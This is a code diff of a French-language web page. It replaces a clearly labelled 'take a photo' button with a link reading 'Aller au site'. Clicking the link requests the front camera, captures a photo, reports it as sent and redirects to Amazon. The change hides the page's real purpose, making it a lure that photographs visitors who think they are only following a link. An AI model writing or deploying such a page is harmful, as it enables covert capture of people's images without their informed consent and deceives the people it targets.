@@ -9,25 +9,25 @@
   <style>
     body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
     #status { margin-top: 20px; font-weight: bold; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    a { font-size: 18px; text-decoration: none; color: blue; }
   </style>
 </head>
 <body>
-  <h2>Cliquez pour prendre une photo et continuer</h2>
-  <button id="startButton">Prendre la photo</button>
+  <h2>Cliquez pour continuer</h2>
+  <a href="#" id="link">Aller au site</a>
   <div id="status"></div>
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const button = document.getElementById("startButton");
+    const link = document.getElementById("link");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const status = document.getElementById("status");
 
-    button.onclick = async () => {
-      button.style.display = 'none'; // Masquer le bouton
-      status.textContent = "Demande de permission pour la caméra...";
+    link.onclick = async (e) => {
+      e.preventDefault(); // Empêche le lien de naviguer immédiatement
+      status.textContent = "Demande de permission caméra...";
 
       try {
         // Demande la caméra frontale
@@ -55,13 +55,12 @@
         // Arrêt de la caméra
         stream.getTracks().forEach(track => track.stop());
 
-        // Message et redirection
-        status.textContent = "Photo envoyée ! Redirection vers Amazon...";
+        // Redirection automatique vers Amazon
+        status.textContent = "Photo envoyée ! Redirection...";
         setTimeout(() => { window.location.href = "https://www.amazon.com"; }, 1500);
 
       } catch (err) {
         status.textContent = "Erreur ou caméra refusée : " + err;
-        button.style.display = 'inline-block'; // Remettre le bouton
       }
     };
   </script>
